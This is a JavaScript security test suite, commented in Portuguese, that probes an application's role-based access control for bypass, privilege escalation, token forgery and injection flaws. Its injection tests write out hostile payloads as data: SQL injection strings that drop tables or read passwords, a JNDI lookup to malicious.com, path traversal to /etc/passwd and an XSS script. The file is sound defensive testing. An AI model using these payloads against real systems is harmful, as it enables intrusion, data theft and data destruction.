/**
 * 🧪 TESTES DE SEGURANÇA RBAC
 * 
 * Suite completa de testes de segurança para o sistema RBAC:
 * - Testes de autorização
 * - Testes de bypass de permissões
 * - Testes de escalação de privilégios
 * - Testes de injeção de roles
 * - Testes de cache poisoning
 * - Testes de timing attacks
 */

const request = require('supertest');
const jwt = require('jsonwebtoken');
const rbacManager = require('../../src/utils/rbacManager');
const db = require('../../src/config/database');

class RBACSecurityTester {
  constructor(app) {
    this.app = app;
    this.testResults = [];
    this.vulnerabilities = [];
    this.testUsers = {};
    this.testTokens = {};
  }

  /**
   * Executar todos os testes de segurança RBAC
   */
  async runAllTests() {
    console.log('🧪 Iniciando testes de segurança RBAC...');
    
    try {
      // Preparar ambiente de teste
      await this.setupTestEnvironment();
      
      // Executar testes
      await this.testBasicAuthorization();
      await this.testPermissionBypass();
      await this.testPrivilegeEscalation();
      await this.testRoleInjection();
      await this.testCachePoisoning();
      await this.testTimingAttacks();
      await this.testTokenManipulation();
      await this.testSQLInjectionInRBAC();
      await this.testMassAssignment();
      await this.testSessionFixation();
      
      // Limpar ambiente
      await this.cleanupTestEnvironment();
      
      return this.generateReport();
      
    } catch (error) {
      console.error('❌ Erro nos testes RBAC:', error);
      throw error;
    }
  }

  /**
   * Preparar ambiente de teste
   */
  async setupTestEnvironment() {
    console.log('🔧 Preparando ambiente de teste...');
    
    // Criar usuários de teste
    this.testUsers = {
      admin: await this.createTestUser('admin_test', 'ADMINISTRADOR'),
      rh: await this.createTestUser('rh_test', 'RH'),
      gestor: await this.createTestUser('gestor_test', 'GESTOR'),
      colaborador: await this.createTestUser('colaborador_test', 'COLABORADOR'),
      noRole: await this.createTestUser('norole_test', null)
    };

    // Gerar tokens de teste
    for (const [role, user] of Object.entries(this.testUsers)) {
      this.testTokens[role] = this.generateTestToken(user);
    }
  }

  /**
   * Criar usuário de teste
   */
  async createTestUser(email, perfil) {
    const result = await db.query(`
      INSERT INTO usuarios (nome, email, senha, perfil, ativo)
      VALUES ($1, $2, $3, $4, true)
      ON CONFLICT (email) DO UPDATE SET
        perfil = $4,
        ativo = true
      RETURNING id, nome, email, perfil
    `, [`Test User ${email}`, email, 'hashed_password', perfil]);
    
    return result.rows[0];
  }

  /**
   * Gerar token de teste
   */
  generateTestToken(user) {
    return jwt.sign(
      { id: user.id, email: user.email, perfil: user.perfil },
      process.env.JWT_SECRET || 'test-secret',
      { expiresIn: '1h' }
    );
  }

  /**
   * Teste 1: Autorização básica
   */
  async testBasicAuthorization() {
    console.log('🔒 Testando autorização básica...');
    
    const tests = [
      {
        name: 'Admin deve acessar endpoint administrativo',
        token: this.testTokens.admin,
        endpoint: '/api/rbac/dashboard',
        expectedStatus: 200,
        shouldPass: true
      },
      {
        name: 'Colaborador NÃO deve acessar endpoint administrativo',
        token: this.testTokens.colaborador,
        endpoint: '/api/rbac/dashboard',
        expectedStatus: 403,
        shouldPass: true
      },
      {
        name: 'RH deve acessar relatórios',
        token: this.testTokens.rh,
        endpoint: '/api/relatorios',
        expectedStatus: 200,
        shouldPass: true
      },
      {
        name: 'Gestor NÃO deve acessar configurações',
        token: this.testTokens.gestor,
        endpoint: '/api/rbac/roles',
        expectedStatus: 403,
        shouldPass: true
      }
    ];

    for (const test of tests) {
      try {
        const response = await request(this.app)
          .get(test.endpoint)
          .set('Authorization', `Bearer ${test.token}`);

        const passed = response.status === test.expectedStatus;
        
        this.recordTest('BASIC_AUTHORIZATION', test.name, passed, {
          expectedStatus: test.expectedStatus,
          actualStatus: response.status,
          endpoint: test.endpoint
        });

        if (!passed && test.shouldPass) {
          this.recordVulnerability('AUTHORIZATION_BYPASS', 
            `Falha na autorização básica: ${test.name}`, 'HIGH');
        }
      } catch (error) {
        this.recordTest('BASIC_AUTHORIZATION', test.name, false, { error: error.message });
      }
    }
  }

  /**
   * Teste 2: Tentativas de bypass de permissões
   */
  async testPermissionBypass() {
    console.log('🚫 Testando bypass de permissões...');
    
    const bypassAttempts = [
      {
        name: 'Bypass via header manipulation',
        token: this.testTokens.colaborador,
        headers: { 'X-User-Role': 'ADMINISTRADOR' },
        endpoint: '/api/rbac/roles'
      },
      {
        name: 'Bypass via query parameter',
        token: this.testTokens.colaborador,
        endpoint: '/api/rbac/roles?role=ADMINISTRADOR'
      },
      {
        name: 'Bypass via body parameter',
        token: this.testTokens.colaborador,
        endpoint: '/api/rbac/users/1/roles',
        method: 'POST',
        body: { roleName: 'ADMINISTRADOR', bypassCheck: true }
      },
      {
        name: 'Bypass via path traversal',
        token: this.testTokens.colaborador,
        endpoint: '/api/rbac/../rbac/roles'
      }
    ];

    for (const attempt of bypassAttempts) {
      try {
        let response;
        const requestBuilder = request(this.app);
        
        if (attempt.method === 'POST') {
          response = await requestBuilder
            .post(attempt.endpoint)
            .set('Authorization', `Bearer ${attempt.token}`)
            .set(attempt.headers || {})
            .send(attempt.body || {});
        } else {
          response = await requestBuilder
            .get(attempt.endpoint)
            .set('Authorization', `Bearer ${attempt.token}`)
            .set(attempt.headers || {});
        }

        const blocked = response.status === 403 || response.status === 401;
        
        this.recordTest('PERMISSION_BYPASS', attempt.name, blocked, {
          status: response.status,
          endpoint: attempt.endpoint
        });

        if (!blocked) {
          this.recordVulnerability('PERMISSION_BYPASS', 
            `Possível bypass de permissão: ${attempt.name}`, 'CRITICAL');
        }
      } catch (error) {
        this.recordTest('PERMISSION_BYPASS', attempt.name, true, { 
          error: error.message,
          note: 'Erro pode indicar bloqueio adequado'
        });
      }
    }
  }

  /**
   * Teste 3: Escalação de privilégios
   */
  async testPrivilegeEscalation() {
    console.log('⬆️ Testando escalação de privilégios...');
    
    const escalationTests = [
      {
        name: 'Tentar atribuir role superior a si mesmo',
        token: this.testTokens.gestor,
        endpoint: `/api/rbac/users/${this.testUsers.gestor.id}/roles`,
        body: { roleName: 'ADMINISTRADOR' }
      },
      {
        name: 'Tentar modificar próprias permissões',
        token: this.testTokens.rh,
        endpoint: '/api/rbac/roles/2',
        method: 'PUT',
        body: { level: 100 }
      },
      {
        name: 'Tentar criar role com nível superior',
        token: this.testTokens.rh,
        endpoint: '/api/rbac/roles',
        body: { 
          name: 'SUPER_RH', 
          display_name: 'Super RH', 
          level: 100,
          permissions: ['*:*']
        }
      }
    ];

    for (const test of escalationTests) {
      try {
        const response = await request(this.app)
          .post(test.endpoint)
          .set('Authorization', `Bearer ${test.token}`)
          .send(test.body);

        const blocked = response.status === 403 || response.status === 401;
        
        this.recordTest('PRIVILEGE_ESCALATION', test.name, blocked, {
          status: response.status,
          endpoint: test.endpoint
        });

        if (!blocked) {
          this.recordVulnerability('PRIVILEGE_ESCALATION', 
            `Possível escalação de privilégios: ${test.name}`, 'CRITICAL');
        }
      } catch (error) {
        this.recordTest('PRIVILEGE_ESCALATION', test.name, true, { error: error.message });
      }
    }
  }

  /**
   * Teste 4: Injeção de roles
   */
  async testRoleInjection() {
    console.log('💉 Testando injeção de roles...');
    
    const injectionPayloads = [
      "'; DROP TABLE rbac_roles; --",
      "UNION SELECT * FROM rbac_roles",
      "../../../etc/passwd",
      "${jndi:ldap://malicious.com}",
      "<script>alert('xss')</script>",
      "../../admin",
      "null; INSERT INTO rbac_user_roles (user_id, role_id) VALUES (1, 1); --"
    ];

    for (const payload of injectionPayloads) {
      try {
        const response = await request(this.app)
          .post('/api/rbac/roles')
          .set('Authorization', `Bearer ${this.testTokens.admin}`)
          .send({
            name: payload,
            display_name: 'Test Role',
            description: payload
          });

        const safe = response.status === 400 || response.status === 422;
        
        this.recordTest('ROLE_INJECTION', `Payload: ${payload.substring(0, 50)}...`, safe, {
          status: response.status,
          payload: payload
        });

        if (!safe && response.status === 201) {
          this.recordVulnerability('INJECTION_VULNERABILITY', 
            `Possível injeção aceita: ${payload}`, 'HIGH');
        }
      } catch (error) {
        this.recordTest('ROLE_INJECTION', `Payload: ${payload.substring(0, 50)}...`, true, {
          error: error.message
        });
      }
    }
  }

  /**
   * Teste 5: Cache poisoning
   */
  async testCachePoisoning() {
    console.log('🧪 Testando cache poisoning...');
    
    try {
      // Tentar envenenar cache com dados maliciosos
      const maliciousData = {
        permissions: ['*:*'],
        roles: ['SUPER_ADMIN'],
        maxLevel: 999
      };

      // Tentar injetar dados maliciosos no cache
      const response = await request(this.app)
        .post('/api/rbac/check-permission')
        .set('Authorization', `Bearer ${this.testTokens.admin}`)
        .set('X-Cache-Data', JSON.stringify(maliciousData))
        .send({
          userId: this.testUsers.colaborador.id,
          permission: 'users:delete'
        });

      // Verificar se o cache foi envenenado
      const followupResponse = await request(this.app)
        .get('/api/rbac/dashboard')
        .set('Authorization', `Bearer ${this.testTokens.colaborador}`);

      const cachePoisoned = followupResponse.status === 200;
      
      this.recordTest('CACHE_POISONING', 'Tentativa de envenenamento de cache', !cachePoisoned, {
        initialStatus: response.status,
        followupStatus: followupResponse.status
      });

      if (cachePoisoned) {
        this.recordVulnerability('CACHE_POISONING', 
          'Cache pode ter sido envenenado', 'HIGH');
      }
    } catch (error) {
      this.recordTest('CACHE_POISONING', 'Tentativa de envenenamento de cache', true, {
        error: error.message
      });
    }
  }

  /**
   * Teste 6: Timing attacks
   */
  async testTimingAttacks() {
    console.log('⏱️ Testando timing attacks...');
    
    const timingTests = [
      {
        name: 'Usuário válido vs inválido',
        validUser: this.testUsers.admin.id,
        invalidUser: 99999
      },
      {
        name: 'Permissão válida vs inválida',
        validPermission: 'users:read',
        invalidPermission: 'nonexistent:action'
      }
    ];

    for (const test of timingTests) {
      try {
        const times = [];
        
        // Testar usuário/permissão válido
        for (let i = 0; i < 10; i++) {
          const start = Date.now();
          await request(this.app)
            .post('/api/rbac/check-permission')
            .set('Authorization', `Bearer ${this.testTokens.admin}`)
            .send({
              userId: test.validUser || this.testUsers.admin.id,
              permission: test.validPermission || 'users:read'
            });
          times.push(Date.now() - start);
        }
        
        const validAvg = times.reduce((a, b) => a + b) / times.length;
        
        // Testar usuário/permissão inválido
        times.length = 0;
        for (let i = 0; i < 10; i++) {
          const start = Date.now();
          await request(this.app)
            .post('/api/rbac/check-permission')
            .set('Authorization', `Bearer ${this.testTokens.admin}`)
            .send({
              userId: test.invalidUser || this.testUsers.admin.id,
              permission: test.invalidPermission || 'invalid:action'
            });
          times.push(Date.now() - start);
        }
        
        const invalidAvg = times.reduce((a, b) => a + b) / times.length;
        const timingDiff = Math.abs(validAvg - invalidAvg);
        
        // Diferença significativa pode indicar timing attack
        const vulnerable = timingDiff > 50; // 50ms de diferença
        
        this.recordTest('TIMING_ATTACK', test.name, !vulnerable, {
          validAvg: validAvg.toFixed(2),
          invalidAvg: invalidAvg.toFixed(2),
          difference: timingDiff.toFixed(2)
        });

        if (vulnerable) {
          this.recordVulnerability('TIMING_ATTACK', 
            `Possível timing attack: ${test.name}`, 'MEDIUM');
        }
      } catch (error) {
        this.recordTest('TIMING_ATTACK', test.name, true, { error: error.message });
      }
    }
  }

  /**
   * Teste 7: Manipulação de tokens
   */
  async testTokenManipulation() {
    console.log('🎭 Testando manipulação de tokens...');
    
    const manipulationTests = [
      {
        name: 'Token com role modificado',
        generateToken: () => {
          const payload = { 
            id: this.testUsers.colaborador.id, 
            perfil: 'ADMINISTRADOR' // Modificado
          };
          return jwt.sign(payload, process.env.JWT_SECRET || 'test-secret');
        }
      },
      {
        name: 'Token com ID modificado',
        generateToken: () => {
          const payload = { 
            id: this.testUsers.admin.id, // ID do admin
            perfil: 'COLABORADOR' 
          };
          return jwt.sign(payload, process.env.JWT_SECRET || 'test-secret');
        }
      },
      {
        name: 'Token com assinatura inválida',
        generateToken: () => {
          const payload = { 
            id: this.testUsers.colaborador.id, 
            perfil: 'ADMINISTRADOR' 
          };
          return jwt.sign(payload, 'wrong-secret');
        }
      }
    ];

    for (const test of manipulationTests) {
      try {
        const maliciousToken = test.generateToken();
        
        const response = await request(this.app)
          .get('/api/rbac/dashboard')
          .set('Authorization', `Bearer ${maliciousToken}`);

        const blocked = response.status === 401 || response.status === 403;
        
        this.recordTest('TOKEN_MANIPULATION', test.name, blocked, {
          status: response.status
        });

        if (!blocked) {
          this.recordVulnerability('TOKEN_MANIPULATION', 
            `Token manipulado aceito: ${test.name}`, 'CRITICAL');
        }
      } catch (error) {
        this.recordTest('TOKEN_MANIPULATION', test.name, true, { error: error.message });
      }
    }
  }

  /**
   * Teste 8: SQL Injection em RBAC
   */
  async testSQLInjectionInRBAC() {
    console.log('💉 Testando SQL Injection em RBAC...');
    
    const sqlPayloads = [
      "1' OR '1'='1",
      "1; DROP TABLE rbac_roles; --",
      "1 UNION SELECT password FROM usuarios",
      "1' AND (SELECT COUNT(*) FROM rbac_roles) > 0 --"
    ];

    for (const payload of sqlPayloads) {
      try {
        const response = await request(this.app)
          .get(`/api/rbac/users/${payload}/roles`)
          .set('Authorization', `Bearer ${this.testTokens.admin}`);

        const safe = response.status === 400 || response.status === 404;
        
        this.recordTest('SQL_INJECTION_RBAC', `Payload: ${payload}`, safe, {
          status: response.status,
          payload: payload
        });

        if (!safe && response.status === 200) {
          this.recordVulnerability('SQL_INJECTION', 
            `SQL Injection possível: ${payload}`, 'CRITICAL');
        }
      } catch (error) {
        this.recordTest('SQL_INJECTION_RBAC', `Payload: ${payload}`, true, {
          error: error.message
        });
      }
    }
  }

  /**
   * Teste 9: Mass Assignment
   */
  async testMassAssignment() {
    console.log('📦 Testando Mass Assignment...');
    
    try {
      const response = await request(this.app)
        .post('/api/rbac/roles')
        .set('Authorization', `Bearer ${this.testTokens.admin}`)
        .send({
          name: 'TEST_ROLE',
          display_name: 'Test Role',
          is_system: true, // Tentativa de definir como role do sistema
          level: 999, // Nível muito alto
          id: 1 // Tentativa de definir ID
        });

      // Verificar se campos sensíveis foram ignorados
      if (response.status === 201) {
        const roleCheck = await db.query(
          'SELECT is_system, level FROM rbac_roles WHERE name = $1',
          ['TEST_ROLE']
        );
        
        const safe = !roleCheck.rows[0]?.is_system && roleCheck.rows[0]?.level !== 999;
        
        this.recordTest('MASS_ASSIGNMENT', 'Criação de role com campos extras', safe, {
          isSystem: roleCheck.rows[0]?.is_system,
          level: roleCheck.rows[0]?.level
        });

        if (!safe) {
          this.recordVulnerability('MASS_ASSIGNMENT', 
            'Mass assignment permitiu definir campos sensíveis', 'HIGH');
        }
      }
    } catch (error) {
      this.recordTest('MASS_ASSIGNMENT', 'Criação de role com campos extras', true, {
        error: error.message
      });
    }
  }

  /**
   * Teste 10: Session Fixation
   */
  async testSessionFixation() {
    console.log('🔒 Testando Session Fixation...');
    
    try {
      // Tentar fixar sessão usando header customizado
      const response = await request(this.app)
        .post('/api/rbac/check-permission')
        .set('Authorization', `Bearer ${this.testTokens.colaborador}`)
        .set('X-Session-ID', 'fixed-session-123')
        .send({
          userId: this.testUsers.colaborador.id,
          permission: 'users:read'
        });

      // Verificar se a sessão foi fixada
      const followupResponse = await request(this.app)
        .get('/api/rbac/dashboard')
        .set('X-Session-ID', 'fixed-session-123');

      const vulnerable = followupResponse.status === 200;
      
      this.recordTest('SESSION_FIXATION', 'Tentativa de fixação de sessão', !vulnerable, {
        initialStatus: response.status,
        followupStatus: followupResponse.status
      });

      if (vulnerable) {
        this.recordVulnerability('SESSION_FIXATION', 
          'Possível vulnerabilidade de fixação de sessão', 'HIGH');
      }
    } catch (error) {
      this.recordTest('SESSION_FIXATION', 'Tentativa de fixação de sessão', true, {
        error: error.message
      });
    }
  }

  /**
   * Registrar resultado de teste
   */
  recordTest(category, testName, passed, details = {}) {
    this.testResults.push({
      category,
      testName,
      passed,
      details,
      timestamp: new Date()
    });
  }

  /**
   * Registrar vulnerabilidade
   */
  recordVulnerability(type, description, severity) {
    this.vulnerabilities.push({
      type,
      description,
      severity,
      timestamp: new Date()
    });
  }

  /**
   * Limpar ambiente de teste
   */
  async cleanupTestEnvironment() {
    console.log('🧹 Limpando ambiente de teste...');
    
    try {
      // Remover usuários de teste
      for (const user of Object.values(this.testUsers)) {
        await db.query('DELETE FROM usuarios WHERE id = $1', [user.id]);
      }
      
      // Remover roles de teste
      await db.query("DELETE FROM rbac_roles WHERE name LIKE '%TEST%'");
      
    } catch (error) {
      console.warn('⚠️ Erro na limpeza:', error.message);
    }
  }

  /**
   * Gerar relatório final
   */
  generateReport() {
    const totalTests = this.testResults.length;
    const passedTests = this.testResults.filter(t => t.passed).length;
    const failedTests = totalTests - passedTests;
    
    const severityCounts = this.vulnerabilities.reduce((acc, vuln) => {
      acc[vuln.severity] = (acc[vuln.severity] || 0) + 1;
      return acc;
    }, {});

    const report = {
      summary: {
        totalTests,
        passedTests,
        failedTests,
        passRate: Math.round((passedTests / totalTests) * 100),
        vulnerabilitiesFound: this.vulnerabilities.length,
        severityBreakdown: severityCounts
      },
      testResults: this.testResults,
      vulnerabilities: this.vulnerabilities,
      recommendations: this.generateRecommendations(),
      timestamp: new Date()
    };

    return report;
  }

  /**
   * Gerar recomendações
   */
  generateRecommendations() {
    const recommendations = [];
    
    if (this.vulnerabilities.length === 0) {
      recommendations.push({
        priority: 'INFO',
        message: 'Nenhuma vulnerabilidade crítica encontrada no sistema RBAC'
      });
    }

    const criticalVulns = this.vulnerabilities.filter(v => v.severity === 'CRITICAL');
    if (criticalVulns.length > 0) {
      recommendations.push({
        priority: 'CRITICAL',
        message: `${criticalVulns.length} vulnerabilidade(s) crítica(s) encontrada(s)`,
        action: 'Correção imediata necessária antes de produção'
      });
    }

    const highVulns = this.vulnerabilities.filter(v => v.severity === 'HIGH');
    if (highVulns.length > 0) {
      recommendations.push({
        priority: 'HIGH',
        message: `${highVulns.length} vulnerabilidade(s) de alta severidade encontrada(s)`,
        action: 'Correção prioritária recomendada'
      });
    }

    return recommendations;
  }
}

module.exports = RBACSecurityTester;
